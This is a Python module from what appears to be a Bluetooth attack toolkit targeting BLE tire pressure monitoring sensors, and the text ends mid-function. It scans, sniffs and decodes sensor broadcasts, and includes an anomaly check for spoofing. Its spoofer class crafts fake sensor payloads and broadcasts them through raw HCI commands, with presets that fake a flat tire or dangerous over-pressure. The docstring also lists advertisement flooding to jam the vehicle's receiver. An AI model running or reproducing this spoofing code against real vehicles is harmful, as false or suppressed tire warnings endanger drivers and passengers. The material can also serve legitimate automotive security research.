"""TPMS (Tire Pressure Monitoring System) BLE attack module.

Targets BLE-based TPMS sensors that communicate tire pressure, temperature,
and battery status to the vehicle ECU/IVI. Supports scanning, sniffing,
decoding, sensor impersonation, advertisement flooding, and SDR capture.

Architecture note:
  TPMS sensors are BLE *peripherals* that broadcast advertisements.
  The vehicle (ECU/VCSEC) is the BLE *central/observer* that listens.
  There is no direct sensor-to-IVI BLE path in production vehicles —
  data flows: Sensor -> BLE -> ECU -> CAN bus -> IVI.

  Aftermarket BLE TPMS: broadcast-only advertisements, zero auth.
  Tesla BLE TPMS: Protobuf over BLE to VCSEC ECU, auto-learn enrollment.

Attack capabilities:
  - BLE TPMS sensor discovery and identification
  - Advertisement sniffing and decoding (pressure, temp, battery)
  - Sensor impersonation (fake readings to trigger IVI alerts)
  - Advertisement flood (DoS TPMS receiver on ECU)
  - SDR capture for 315/433 MHz traditional TPMS (via rtl_433)
  - HCI raw capture for deep BLE packet analysis

Hardware support:
  - Standard HCI adapter (scan, basic sniff, BLE advertisement TX)
  - nRF52840 dongle (enhanced sniffing via nRF Sniffer for Wireshark)
  - B210/HackRF SDR + rtl_433 (315/433 MHz traditional TPMS)

References:
  - Rouf et al. USENIX Security 2010 — TPMS security analysis
  - Synacktiv Hexacon 2024 — Tesla VCSEC 0-click RCE via TPMS (CVE-2025-2082)
  - GitHub: andi38/TPMS, ra6070/BLE-TPMS — BLE TPMS packet formats
"""

import asyncio
import os
import re
import struct
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime

from bt_tap.utils.bt_helpers import run_cmd, check_tool
from bt_tap.utils.output import (
    info, success, error, warning, verbose, debug,
    phase, step, substep, section, summary_panel, result_box,
    console, target,
)


# ── TPMS BLE Identifiers ─────────────────────────────────────────────────

# Known BLE TPMS service UUIDs
TPMS_SERVICE_UUIDS = {
    "000027a5-0000-1000-8000-00805f9b34fb": "TPMS (0x27a5)",
    "0000fbb0-0000-1000-8000-00805f9b34fb": "TPMS Custom Service",
    "0000180f-0000-1000-8000-00805f9b34fb": "Battery Service",
}

# Known TPMS BLE device name patterns
TPMS_NAME_PATTERNS = [
    re.compile(r"TPMS", re.I),
    re.compile(r"Tire", re.I),
    re.compile(r"TPS[_\-]?\d", re.I),
    re.compile(r"BLE[_\-]?TP", re.I),
    re.compile(r"Sensor[_\-]?[LRFB]", re.I),   # Sensor_FL, Sensor_FR
    re.compile(r"[LR][FR]_TIRE", re.I),          # LF_TIRE, RF_TIRE
    re.compile(r"Pressure", re.I),
    re.compile(r"^BR$"),                          # Common aftermarket name
]

# Tire position identifiers
TIRE_POSITIONS = {
    0x01: "Front Left (FL)",
    0x02: "Front Right (FR)",
    0x03: "Rear Left (RL)",
    0x04: "Rear Right (RR)",
    0x05: "Spare",
}


# ── Data Classes ──────────────────────────────────────────────────────────

@dataclass
class TPMSReading:
    """Decoded TPMS sensor reading."""
    address: str
    name: str
    position: str = "Unknown"
    pressure_psi: float = 0.0
    pressure_kpa: float = 0.0
    temperature_c: float = 0.0
    temperature_f: float = 0.0
    battery_pct: int = -1
    battery_volts: float = 0.0
    status_flags: int = 0
    alarm: bool = False
    rssi: int = -100
    timestamp: str = ""
    raw_data: bytes = b""
    decode_format: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().strftime("%H:%M:%S")
        if self.pressure_psi > 0 and self.pressure_kpa == 0:
            self.pressure_kpa = self.pressure_psi * 6.895
        elif self.pressure_kpa > 0 and self.pressure_psi == 0:
            self.pressure_psi = self.pressure_kpa / 6.895
        if self.temperature_c != 0 and self.temperature_f == 0:
            self.temperature_f = self.temperature_c * 9 / 5 + 32


@dataclass
class TPMSSensor:
    """Tracked TPMS sensor with reading history."""
    address: str
    name: str
    position: str = "Unknown"
    readings: list[TPMSReading] = field(default_factory=list)
    first_seen: str = ""
    last_seen: str = ""

    def add_reading(self, reading: TPMSReading):
        self.readings.append(reading)
        self.last_seen = reading.timestamp
        if not self.first_seen:
            self.first_seen = reading.timestamp


# ── TPMS Packet Decoders ─────────────────────────────────────────────────

def _decode_7byte_format(data: bytes) -> dict | None:
    """Decode 7-byte aftermarket TPMS manufacturer data.

    Format (from andi38/TPMS, common cheap BLE sensors):
      Byte 0:    Status flags (alarm, rotating, standing, low-pressure, etc.)
      Byte 1:    Battery voltage (value / 10 = volts)
      Byte 2:    Temperature (direct Celsius)
      Bytes 3-4: Absolute pressure (LE uint16, value / 10 = PSI)
      Bytes 5-6: Checksum
    """
    if len(data) < 7:
        return None
    try:
        status = data[0]
        battery_volts = data[1] / 10.0
        temperature_c = float(data[2])
        pressure_raw = struct.unpack_from("<H", data, 3)[0]
        pressure_psi = pressure_raw / 10.0

        # Sanity checks
        if not (0 <= pressure_psi <= 100):
            return None
        if not (-40 <= temperature_c <= 150):
            return None

        alarm = bool(status & 0x80)  # High bit = alarm
        battery_pct = min(100, max(0, int((battery_volts - 2.0) / (3.3 - 2.0) * 100)))

        return {
            "pressure_psi": pressure_psi,
            "temperature_c": temperature_c,
            "battery_pct": battery_pct,
            "battery_volts": battery_volts,
            "status_flags": status,
            "alarm": alarm,
            "format": "7-byte aftermarket",
        }
    except (struct.error, IndexError):
        return None


def _decode_18byte_format(data: bytes) -> dict | None:
    """Decode 18-byte aftermarket TPMS manufacturer data.

    Format (from ra6070/BLE-TPMS, ESP32-based systems):
      Bytes 0-1:   Manufacturer ID (0x0001)
      Byte 2:      Sensor number / position
      Bytes 3-4:   Sensor address prefix
      Bytes 5-7:   Full sensor address
      Bytes 8-11:  Pressure (LE uint32, value / 1000 = kPa)
      Bytes 12-15: Temperature (LE int32, value / 100 = Celsius)
      Byte 16:     Battery percentage
      Byte 17:     Alarm (0x00=normal, 0x01=no-pressure)
    """
    if len(data) < 18:
        return None
    try:
        pressure_raw = struct.unpack_from("<I", data, 8)[0]
        temperature_raw = struct.unpack_from("<i", data, 12)[0]
        pressure_kpa = pressure_raw / 1000.0
        temperature_c = temperature_raw / 100.0

        if not (0 <= pressure_kpa <= 700):
            return None
        if not (-40 <= temperature_c <= 150):
            return None

        return {
            "pressure_kpa": pressure_kpa,
            "temperature_c": temperature_c,
            "battery_pct": data[16],
            "alarm": data[17] != 0,
            "status_flags": data[17],
            "position_byte": data[2],
            "format": "18-byte ESP32",
        }
    except (struct.error, IndexError):
        return None


def _decode_generic_format(data: bytes) -> dict | None:
    """Generic fallback decoder for unknown TPMS formats.

    Tries common patterns:
      [position:1][pressure:2 LE][temp:1 offset+40][battery:1]
    """
    if len(data) < 5:
        return None
    try:
        pressure_raw = struct.unpack_from("<H", data, 1)[0]

        # Try: pressure in 0.01 kPa
        pressure_kpa = pressure_raw * 0.01
        if 50 <= pressure_kpa <= 500:
            temperature_c = data[3] - 40.0
            if -40 <= temperature_c <= 150:
                return {
                    "pressure_kpa": pressure_kpa,
                    "temperature_c": temperature_c,
                    "battery_pct": data[4] if len(data) > 4 else -1,
                    "format": "generic (0.01 kPa)",
                }

        # Try: pressure in 0.1 PSI
        pressure_psi = pressure_raw / 10.0
        if 0 <= pressure_psi <= 100:
            temperature_c = data[3] - 40.0 if len(data) > 3 else 0
            if -40 <= temperature_c <= 150:
                return {
                    "pressure_psi": pressure_psi,
                    "temperature_c": temperature_c,
                    "battery_pct": data[4] if len(data) > 4 else -1,
                    "format": "generic (0.1 PSI)",
                }

        return None
    except (struct.error, IndexError):
        return None


def decode_tpms_data(data: bytes) -> dict | None:
    """Try all known TPMS data decoders on raw data.

    Returns decoded dict or None if no format matches.
    """
    # Try formats in order of specificity
    if len(data) >= 18:
        result = _decode_18byte_format(data)
        if result:
            return result

    if len(data) == 7 or (6 <= len(data) <= 8):
        result = _decode_7byte_format(data)
        if result:
            return result

    return _decode_generic_format(data)


# ── TPMS Scanner ──────────────────────────────────────────────────────────

class TPMSScanner:
    """BLE TPMS sensor scanner and identifier.

    Scans for BLE devices matching known TPMS patterns (name, service UUIDs,
    manufacturer data) and identifies tire position sensors.

    Note: TPMS sensors are BLE peripherals that *advertise*. The vehicle
    ECU is the observer/central that listens. This scanner acts as an
    observer to detect TPMS advertisements.
    """

    def __init__(self, hci: str = "hci0"):
        self.hci = hci
        self.sensors: dict[str, TPMSSensor] = {}

    def scan(self, duration: int = 15) -> list[TPMSSensor]:
        """Scan for BLE TPMS sensors."""
        with phase("TPMS Sensor Discovery", 1, 1):
            with step("Scanning BLE advertisements"):
                info(f"Scanning for TPMS sensors ({duration}s) on {self.hci}...")
                info("TPMS sensors broadcast as BLE peripherals — listening for advertisements")
                devices = asyncio.run(self._ble_scan(duration))

            with step("Identifying TPMS sensors"):
                tpms_devices = self._filter_tpms(devices)
                if tpms_devices:
                    success(f"Found {len(tpms_devices)} TPMS sensor(s)")
                    for sensor in tpms_devices:
                        self.sensors[sensor.address] = sensor
                        substep(f"{target(sensor.address)} - {sensor.name} [{sensor.position}]")
                else:
                    warning("No TPMS sensors identified")
                    info("Possible reasons:")
                    substep("Sensors use 315/433 MHz RF (not BLE) — try 'bt-tap tpms sdr' with rtl_433")
                    substep("Sensors not active (vehicle stationary, no tire rotation)")
                    substep("No aftermarket BLE TPMS installed on nearby vehicles")

        return list(self.sensors.values())

    async def _ble_scan(self, duration: int) -> list:
        """Raw BLE scan returning (device, adv_data) tuples."""
        from bleak import BleakScanner

        discovered = await BleakScanner.discover(
            timeout=duration,
            return_adv=True,
        )
        verbose(f"BLE scan found {len(discovered)} total device(s)")
        return list(discovered.values())

    def _filter_tpms(self, devices: list) -> list[TPMSSensor]:
        """Filter BLE scan results to identify TPMS sensors."""
        tpms_sensors = []

        for device, adv_data in devices:
            name = adv_data.local_name or device.name or ""
            is_tpms = False

            # Check name patterns
            for pattern in TPMS_NAME_PATTERNS:
                if pattern.search(name):
                    is_tpms = True
                    verbose(f"Name match: {name} -> {pattern.pattern}")
                    break

            # Check service UUIDs (0x27a5 is common TPMS UUID)
            if not is_tpms and adv_data.service_uuids:
                for uuid in adv_data.service_uuids:
                    if uuid.lower() in TPMS_SERVICE_UUIDS:
                        is_tpms = True
                        verbose(f"UUID match: {uuid} ({TPMS_SERVICE_UUIDS[uuid.lower()]})")
                        break

            # Check manufacturer data for TPMS-like payloads
            if not is_tpms and adv_data.manufacturer_data:
                for company_id, data in adv_data.manufacturer_data.items():
                    decoded = decode_tpms_data(bytes(data))
                    if decoded:
                        verbose(f"Manufacturer data decoded as TPMS: "
                                f"0x{company_id:04x}, {len(data)} bytes, "
                                f"format={decoded.get('format', '?')}")
                        is_tpms = True
                        break

            if is_tpms:
                position = self._guess_position(name)
                sensor = TPMSSensor(
                    address=device.address,
                    name=name or "TPMS Sensor",
                    position=position,
                )

                reading = self._make_reading(device.address, name, adv_data)
                if reading:
                    reading.position = position
                    sensor.add_reading(reading)

                tpms_sensors.append(sensor)
            else:
                debug(f"Skipped: {device.address} ({name or 'unnamed'}) "
                      f"rssi={adv_data.rssi}")

        return tpms_sensors

    def _guess_position(self, name: str) -> str:
        """Guess tire position from device name."""
        name_upper = name.upper()
        patterns = {
            "Front Left (FL)": [r"\bFL\b", r"FRONT.?L", r"\bLF\b", r"LEFT.?F"],
            "Front Right (FR)": [r"\bFR\b", r"FRONT.?R", r"\bRF\b", r"RIGHT.?F"],
            "Rear Left (RL)": [r"\bRL\b", r"REAR.?L", r"\bLR\b", r"LEFT.?R"],
            "Rear Right (RR)": [r"\bRR\b", r"REAR.?R", r"RIGHT.?R"],
            "Spare": [r"SPARE", r"\bSP\b"],
        }
        for position, pats in patterns.items():
            for pat in pats:
                if re.search(pat, name_upper):
                    return position
        return "Unknown"

    def _make_reading(self, address: str, name: str, adv_data) -> TPMSReading | None:
        """Create a TPMSReading from BLE advertisement data."""
        reading = TPMSReading(
            address=address,
            name=name or "TPMS Sensor",
            rssi=adv_data.rssi if hasattr(adv_data, "rssi") else -100,
        )

        # Try manufacturer data
        if adv_data.manufacturer_data:
            for company_id, data in adv_data.manufacturer_data.items():
                data_bytes = bytes(data)
                decoded = decode_tpms_data(data_bytes)
                if decoded:
                    reading.pressure_psi = decoded.get("pressure_psi", 0)
                    reading.pressure_kpa = decoded.get("pressure_kpa", 0)
                    reading.temperature_c = decoded.get("temperature_c", 0)
                    reading.battery_pct = decoded.get("battery_pct", -1)
                    reading.battery_volts = decoded.get("battery_volts", 0)
                    reading.status_flags = decoded.get("status_flags", 0)
                    reading.alarm = decoded.get("alarm", False)
                    reading.raw_data = data_bytes
                    reading.decode_format = decoded.get("format", "")
                    reading.__post_init__()
                    return reading

        # Try service data
        if adv_data.service_data:
            for uuid, data in adv_data.service_data.items():
                data_bytes = bytes(data)
                decoded = decode_tpms_data(data_bytes)
                if decoded:
                    reading.pressure_psi = decoded.get("pressure_psi", 0)
                    reading.pressure_kpa = decoded.get("pressure_kpa", 0)
                    reading.temperature_c = decoded.get("temperature_c", 0)
                    reading.battery_pct = decoded.get("battery_pct", -1)
                    reading.raw_data = data_bytes
                    reading.decode_format = decoded.get("format", "")
                    reading.__post_init__()
                    return reading

        return reading if reading.rssi != -100 else None


# ── TPMS Sniffer ──────────────────────────────────────────────────────────

class TPMSSniffer:
    """Continuous BLE TPMS advertisement sniffer.

    Monitors BLE advertisements in real-time and logs decoded TPMS sensor
    readings. Supports standard HCI adapter and nRF52840 dongle.
    """

    def __init__(self, hci: str = "hci0", output_dir: str = "tpms_capture"):
        self.hci = hci
        self.output_dir = output_dir
        self.sensors: dict[str, TPMSSensor] = {}
        self._running = False
        self._capture_file = None
        self._scanner = TPMSScanner(hci)

    def sniff(self, duration: int = 60, use_nrf: bool = False) -> dict[str, TPMSSensor]:
        """Sniff BLE TPMS advertisements for a duration.

        Args:
            duration: Capture duration in seconds
            use_nrf: Use nRF52840 Sniffer for enhanced PCAP capture
        """
        os.makedirs(self.output_dir, exist_ok=True)

        with phase("TPMS Sniffing", 1, 1):
            if use_nrf:
                return self._sniff_nrf(duration)
            return self._sniff_ble(duration)

    def _sniff_ble(self, duration: int) -> dict[str, TPMSSensor]:
        """Sniff using standard BLE HCI adapter with Bleak."""
        with step(f"BLE advertisement capture ({duration}s)"):
            info(f"Monitoring BLE TPMS advertisements for {duration}s...")
            info("Listening for sensor broadcasts (sensors advertise, vehicle listens)")
            self._running = True
            capture_path = os.path.join(self.output_dir, "tpms_sniff.log")
            self._capture_file = open(capture_path, "a")
            self._capture_file.write(
                f"\n--- Capture started: {datetime.now().isoformat()} ---\n"
            )

            try:
                asyncio.run(self._ble_monitor(duration))
            except KeyboardInterrupt:
                warning("Sniffing interrupted by user")
            finally:
                self._running = False
                if self._capture_file:
                    self._capture_file.close()

            success(f"Captured data from {len(self.sensors)} sensor(s)")
            total_readings = sum(len(s.readings) for s in self.sensors.values())
            substep(f"Total readings: {total_readings}")
            substep(f"Log saved: {capture_path}")

        self._print_summary()
        return self.sensors

    async def _ble_monitor(self, duration: int):
        """Async BLE monitoring loop with callback."""
        from bleak import BleakScanner

        def _callback(device, adv_data):
            if not self._running:
                return

            name = adv_data.local_name or device.name or ""

            # Check if known sensor or matches patterns
            is_tpms = device.address in self.sensors
            if not is_tpms:
                for pattern in TPMS_NAME_PATTERNS:
                    if pattern.search(name):
                        is_tpms = True
                        break

            # Also check manufacturer data for TPMS payloads
            if not is_tpms and adv_data.manufacturer_data:
                for _, data in adv_data.manufacturer_data.items():
                    if decode_tpms_data(bytes(data)):
                        is_tpms = True
                        break

            if not is_tpms:
                return

            reading = self._scanner._make_reading(device.address, name, adv_data)
            if not reading:
                return

            if device.address not in self.sensors:
                self.sensors[device.address] = TPMSSensor(
                    address=device.address,
                    name=name or "TPMS Sensor",
                    position=self._scanner._guess_position(name),
                )
                info(f"New TPMS sensor: {target(device.address)} ({name})")

            sensor = self.sensors[device.address]
            reading.position = sensor.position
            sensor.add_reading(reading)

            # Log to file
            log_line = (
                f"[{reading.timestamp}] {device.address} "
                f"P={reading.pressure_psi:.1f}psi/{reading.pressure_kpa:.1f}kPa "
                f"T={reading.temperature_c:.1f}C "
                f"Bat={reading.battery_pct}% "
                f"RSSI={reading.rssi} "
                f"Alarm={reading.alarm} "
                f"Fmt={reading.decode_format} "
                f"Raw={reading.raw_data.hex()}\n"
            )
            if self._capture_file:
                self._capture_file.write(log_line)
                self._capture_file.flush()

            verbose(f"[{device.address}] {reading.pressure_psi:.1f} PSI, "
                    f"{reading.temperature_c:.1f}C, RSSI={reading.rssi}")

        scanner = BleakScanner(detection_callback=_callback)
        await scanner.start()
        await asyncio.sleep(duration)
        await scanner.stop()

    def _sniff_nrf(self, duration: int) -> dict[str, TPMSSensor]:
        """Enhanced sniffing using nRF52840 Sniffer for BLE."""
        with step("nRF52840 Sniffer capture"):
            if not check_tool("nrf_sniffer"):
                warning("nRF Sniffer CLI not found in PATH")
                info("Falling back to standard BLE scan")
                info("To use nRF Sniffer:")
                substep("Flash nRF Sniffer firmware to nRF52840 dongle")
                substep("Install nRF Sniffer for Bluetooth LE (Wireshark plugin)")
                substep("Add nrf_sniffer to PATH")
                return self._sniff_ble(duration)

            capture_path = os.path.join(self.output_dir, "tpms_nrf_capture.pcap")
            info(f"Starting nRF52840 capture ({duration}s) -> {capture_path}")

            proc = subprocess.Popen(
                ["nrf_sniffer", "--capture", capture_path, "--duration", str(duration)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            try:
                proc.wait(timeout=duration + 10)
            except subprocess.TimeoutExpired:
                proc.terminate()
                proc.wait(timeout=5)

            if os.path.exists(capture_path):
                size = os.path.getsize(capture_path)
                success(f"nRF capture saved: {capture_path} ({size} bytes)")
                info("Open in Wireshark for full BLE packet dissection")
            else:
                error("nRF capture file not created")

            # Also run standard BLE scan for real-time identification
            info("Running parallel BLE scan for sensor identification...")
            return self._sniff_ble(min(duration, 30))

    def _print_summary(self):
        """Print summary table of captured TPMS data."""
        if not self.sensors:
            return

        from rich.table import Table
        from rich.style import Style
        from bt_tap.utils.output import CYAN, PURPLE, YELLOW, GREEN, RED, DIM, BLUE

        section("TPMS Capture Summary")

        table = Table(
            title=f"[bold {CYAN}]TPMS Sensors[/bold {CYAN}]",
            show_lines=True,
            border_style=DIM,
            header_style=Style(bold=True, color=CYAN),
        )
        table.add_column("#", style=DIM, width=4, justify="right")
        table.add_column("Address", style=PURPLE)
        table.add_column("Name", style="bold white")
        table.add_column("Position", style=BLUE)
        table.add_column("Last PSI", style=YELLOW, justify="right")
        table.add_column("Last Temp", style=YELLOW, justify="right")
        table.add_column("Battery", justify="right")
        table.add_column("Alarm", justify="center")
        table.add_column("Readings", style=DIM, justify="right")

        for i, sensor in enumerate(self.sensors.values(), 1):
            last = sensor.readings[-1] if sensor.readings else None
            psi = f"{last.pressure_psi:.1f}" if last and last.pressure_psi > 0 else "N/A"
            temp = f"{last.temperature_c:.1f}C" if last and last.temperature_c != 0 else "N/A"

            bat_str = "N/A"
            if last and last.battery_pct >= 0:
                bat = last.battery_pct
                if bat > 50:
                    bat_str = f"[{GREEN}]{bat}%[/{GREEN}]"
                elif bat > 20:
                    bat_str = f"[{YELLOW}]{bat}%[/{YELLOW}]"
                else:
                    bat_str = f"[{RED}]{bat}%[/{RED}]"

            alarm_str = f"[{RED}]YES[/{RED}]" if (last and last.alarm) else f"[{DIM}]no[/{DIM}]"

            table.add_row(
                str(i), sensor.address, sensor.name, sensor.position,
                psi, temp, bat_str, alarm_str, str(len(sensor.readings)),
            )

        console.print(table)


# ── TPMS Decoder ──────────────────────────────────────────────────────────

class TPMSDecoder:
    """Decode and analyze captured TPMS data.

    Parses raw BLE advertisement data or HCI capture logs to extract
    TPMS sensor readings. Detects anomalies like flat tires, rapid
    pressure changes (possible spoofing), and low batteries.
    """

    def __init__(self):
        self.readings: list[TPMSReading] = []

    def decode_raw(self, raw_hex: str, address: str = "00:00:00:00:00:00") -> TPMSReading | None:
        """Decode raw hex TPMS advertisement data."""
        try:
            data = bytes.fromhex(raw_hex.replace(" ", "").replace(":", ""))
        except ValueError:
            error(f"Invalid hex data: {raw_hex}")
            return None

        decoded = decode_tpms_data(data)
        if not decoded:
            warning(f"Could not decode TPMS data: {raw_hex}")
            info("Tried formats: 7-byte aftermarket, 18-byte ESP32, generic")
            return None

        verbose(f"Decoded as: {decoded.get('format', 'unknown')}")

        reading = TPMSReading(
            address=address,
            name="Manual Decode",
            pressure_psi=decoded.get("pressure_psi", 0),
            pressure_kpa=decoded.get("pressure_kpa", 0),
            temperature_c=decoded.get("temperature_c", 0),
            battery_pct=decoded.get("battery_pct", -1),
            battery_volts=decoded.get("battery_volts", 0),
            alarm=decoded.get("alarm", False),
            raw_data=data,
            decode_format=decoded.get("format", ""),
        )
        self.readings.append(reading)
        return reading

    def decode_hci_log(self, log_path: str) -> list[TPMSReading]:
        """Parse btmon/HCI log file for TPMS advertisement data."""
        if not os.path.exists(log_path):
            error(f"Log file not found: {log_path}")
            return []

        with phase("HCI Log Analysis"):
            with step(f"Parsing {log_path}"):
                readings = []
                with open(log_path, "r", errors="replace") as f:
                    content = f.read()

                # Find LE Advertising Report entries
                adv_pattern = re.compile(
                    r"LE Advertising Report.*?"
                    r"Address:\s*([0-9A-Fa-f:]{17}).*?"
                    r"Data:\s*([0-9a-f\s]+)",
                    re.DOTALL | re.IGNORECASE,
                )

                matches = adv_pattern.findall(content)
                verbose(f"Found {len(matches)} advertising reports in log")

                for addr, data_hex in matches:
                    data_hex = data_hex.strip().replace(" ", "")
                    if len(data_hex) >= 10:
                        reading = self.decode_raw(data_hex, addr)
                        if reading:
                            readings.append(reading)

                if readings:
                    success(f"Decoded {len(readings)} TPMS reading(s) from log")
                else:
                    warning("No TPMS data found in HCI log")
                    info("Ensure btmon captured BLE advertisements from TPMS sensors")

                self.readings.extend(readings)
                return readings

    def analyze(self, readings: list[TPMSReading] = None) -> dict:
        """Analyze TPMS readings for anomalies.

        Detects:
          - Flat tire / low pressure (< 25 PSI)
          - Over-inflation (> 44 PSI)
          - Rapid pressure changes (possible spoofing attack)
          - Low battery warnings
          - Alarm flags set by sensor
        """
        readings = readings or self.readings
        if not readings:
            warning("No readings to analyze")
            return {}

        section("TPMS Data Analysis")

        analysis = {
            "total_readings": len(readings),
            "unique_sensors": len(set(r.address for r in readings)),
            "alerts": [],
        }

        by_sensor: dict[str, list[TPMSReading]] = {}
        for r in readings:
            by_sensor.setdefault(r.address, []).append(r)

        for addr, sensor_readings in by_sensor.items():
            pressures = [r.pressure_psi for r in sensor_readings if r.pressure_psi > 0]
            alarms = [r for r in sensor_readings if r.alarm]

            if alarms:
                alert = f"ALARM FLAG: {addr} — sensor reporting alarm condition"
                analysis["alerts"].append(alert)
                warning(alert)

            if pressures:
                avg_psi = sum(pressures) / len(pressures)
                min_psi = min(pressures)
                max_psi = max(pressures)

                if min_psi < 25:
                    alert = f"LOW PRESSURE: {addr} — {min_psi:.1f} PSI (possible flat)"
                    analysis["alerts"].append(alert)
                    warning(alert)

                if max_psi > 44:
                    alert = f"HIGH PRESSURE: {addr} — {max_psi:.1f} PSI (over-inflated)"
                    analysis["alerts"].append(alert)
                    warning(alert)

                # Rapid change = possible spoofing
                if len(pressures) >= 3:
                    for i in range(2, len(pressures)):
                        delta = abs(pressures[i] - pressures[i - 1])
                        if delta > 5:
                            alert = f"RAPID CHANGE: {addr} — {delta:.1f} PSI jump (spoofing?)"
                            analysis["alerts"].append(alert)
                            warning(alert)
                            break

                substep(f"{addr}: avg={avg_psi:.1f} PSI, range={min_psi:.1f}-{max_psi:.1f}")

            for r in sensor_readings:
                if 0 <= r.battery_pct < 20:
                    alert = f"LOW BATTERY: {addr} — {r.battery_pct}%"
                    analysis["alerts"].append(alert)
                    warning(alert)
                    break

        if not analysis["alerts"]:
            success("No anomalies detected in TPMS data")

        summary_panel("TPMS Analysis", {
            "Total Readings": str(analysis["total_readings"]),
            "Unique Sensors": str(analysis["unique_sensors"]),
            "Alerts": str(len(analysis["alerts"])),
        })

        return analysis


# ── TPMS Sensor Impersonation ────────────────────────────────────────────

class TPMSSpoofer:
    """Impersonate a TPMS sensor by broadcasting fake BLE advertisements.

    TPMS sensors are BLE peripherals that broadcast readings as
    advertisement data. The vehicle ECU passively listens. By broadcasting
    our own advertisements matching a TPMS sensor format, we can inject
    fake pressure/temperature data that the ECU will process.

    Aftermarket BLE TPMS has zero authentication — any BLE transmitter
    can broadcast matching advertisements and the receiver will accept them.

    Requires HCI adapter that supports LE advertising (most do).
    """

    def __init__(self, hci: str = "hci0"):
        self.hci = hci

    def spoof_reading(
        self,
        pressure_psi: float = 32.0,
        temperature_c: float = 25.0,
        battery_pct: int = 80,
        position: int = 0x01,
        count: int = 100,
        interval_ms: int = 100,
        sensor_name: str = "TPMS_Sensor",
    ) -> bool:
        """Broadcast spoofed TPMS sensor advertisements.

        Impersonates a TPMS sensor by broadcasting BLE advertisements
        with crafted pressure/temperature data in the 7-byte aftermarket
        format (most common for BLE TPMS receivers).

        Args:
            pressure_psi: Fake tire pressure in PSI
            temperature_c: Fake temperature in Celsius
            battery_pct: Fake battery percentage (0-100)
            position: Tire position byte (0x01=FL, 0x02=FR, 0x03=RL, 0x04=RR)
            count: Number of advertisements to send
            interval_ms: Interval between advertisements in ms
            sensor_name: BLE device name for the fake sensor
        """
        with phase("TPMS Sensor Impersonation"):
            with step("Preparing spoofed TPMS payload"):
                # Build 7-byte aftermarket TPMS format:
                # [status][battery_v*10][temp_c][pressure_psi*10 LE][checksum LE]
                status = 0x00
                if pressure_psi < 25:
                    status |= 0x10  # Low pressure flag
                if pressure_psi == 0:
                    status |= 0x80  # Alarm flag

                bat_voltage = int(min(3.3, 2.0 + (battery_pct / 100.0) * 1.3) * 10)
                temp_byte = max(0, min(255, int(temperature_c)))
                pressure_raw = int(pressure_psi * 10)
                payload = struct.pack("<BBB", status, bat_voltage, temp_byte)
                payload += struct.pack("<H", pressure_raw)
                # Simple checksum
                checksum = sum(payload) & 0xFFFF
                payload += struct.pack("<H", checksum)

                pos_name = TIRE_POSITIONS.get(position, "Unknown")
                info(f"Impersonating TPMS sensor: {pos_name}")
                info(f"Spoofed data: {pressure_psi:.1f} PSI, {temperature_c:.1f}C, "
                     f"bat={battery_pct}%")
                verbose(f"7-byte payload: {payload.hex()}")
                if status & 0x80:
                    info("Alarm flag SET — should trigger dashboard warning")

            with step(f"Broadcasting {count} sensor advertisements"):
                sent = self._broadcast_advertisements(
                    payload, sensor_name, count, interval_ms
                )
                success(f"Sent {sent}/{count} spoofed TPMS advertisements")

        return sent > 0

    def spoof_flat_tire(self, position: int = 0x01, count: int = 200) -> bool:
        """Spoof flat tire (0 PSI) to trigger IVI low-pressure alert."""
        pos_name = TIRE_POSITIONS.get(position, "Unknown")
        info(f"Spoofing flat tire on {pos_name}")
        return self.spoof_reading(
            pressure_psi=0.0,
            temperature_c=25.0,
            battery_pct=80,
            position=position,
            count=count,
        )

    def spoof_over_pressure(self, position: int = 0x01, count: int = 200) -> bool:
        """Spoof dangerously high pressure to trigger IVI alert."""
        pos_name = TIRE_POSITIONS.get(position, "Unknown")
        info(f"Spoofing over-pressure on {pos_name}")
        return self.spoof_reading(
            pressure_psi=65.0,
            temperature_c=85.0,
            battery_pct=80,
            position=position,
            count=count,
        )

    def _broadcast_advertisements(
        self, tpms_payload: bytes, name: str, count: int, interval_ms: int,
    ) -> int:
        """Send BLE advertisements using HCI commands."""
        adv_data = self._build_adv_packet(tpms_payload, name)
        verbose(f"Advertisement data ({len(adv_data)} bytes): {adv_data.hex()}")

        # HCI LE Set Advertising Data
        set_adv_cmd = [
            "hcitool", "-i", self.hci, "cmd",
            "0x08", "0x0008",
            str(len(adv_data)),
        ] + [f"0x{b:02x}" for b in adv_data]

        # HCI LE Set Advertising Parameters (non-connectable undirected)
        interval = max(0x0020, interval_ms * 16 // 10)  # 0.625ms units
        set_params_cmd = [
            "hcitool", "-i", self.hci, "cmd",
            "0x08", "0x0006",
            f"0x{interval & 0xFF:02x}", f"0x{(interval >> 8) & 0xFF:02x}",
            f"0x{interval & 0xFF:02x}", f"0x{(interval >> 8) & 0xFF:02x}",
            "0x03",  # ADV_NONCONN_IND (non-connectable, like real TPMS sensors)
            "0x00", "0x00",
            "0x00", "0x00", "0x00", "0x00", "0x00", "0x00",
            "0x07", "0x00",
        ]

        enable_cmd = [
            "hcitool", "-i", self.hci, "cmd", "0x08", "0x000a", "0x01",
        ]
        disable_cmd = [
            "hcitool", "-i", self.hci, "cmd", "0x08", "0x000a", "0x00",
        ]

        sent = 0
        try:
            result = run_cmd(set_params_cmd, timeout=5)
            if result.returncode != 0:
                error(f"Failed to set advertising parameters: {result.stderr}")
                return 0
            verbose("Advertising parameters configured (ADV_NONCONN_IND)")

            result = run_cmd(set_adv_cmd, timeout=5)
            if result.returncode != 0:
                error(f"Failed to set advertising data: {result.stderr}")
                return 0
            verbose("Advertising data loaded")

            delay = interval_ms / 1000.0
            for i in range(count):
                run_cmd(enable_cmd, timeout=3)
                time.sleep(delay)
                run_cmd(disable_cmd, timeout=3)
                sent += 1

                if (i + 1) % 25 == 0:
                    substep(f"Sent {i + 1}/{count} advertisements")

        except KeyboardInterrupt:
            warning("Spoofing interrupted")
        finally:
            run_cmd(disable_cmd, timeout=3)

        return sent

    def _build_adv_packet(self, tpms_payload: bytes, name: str = "TPMS_Sensor") -> bytes:
        """Build BLE advertisement data with TPMS payload.

        Mimics real aftermarket TPMS sensor advertisements:
          [Flags AD][UUID 0x27a5 AD][Manufacturer Data AD][Short Name AD]
        """
        # AD: Flags (General Discoverable, BR/EDR not supported)
        flags = bytes([0x02, 0x01, 0x06])

        # AD: 16-bit Service UUID (0x27a5 = common TPMS)
        uuid_ad = bytes([0x03, 0x03, 0xa5, 0x27])

        # AD: Manufacturer Specific Data (type 0xFF)
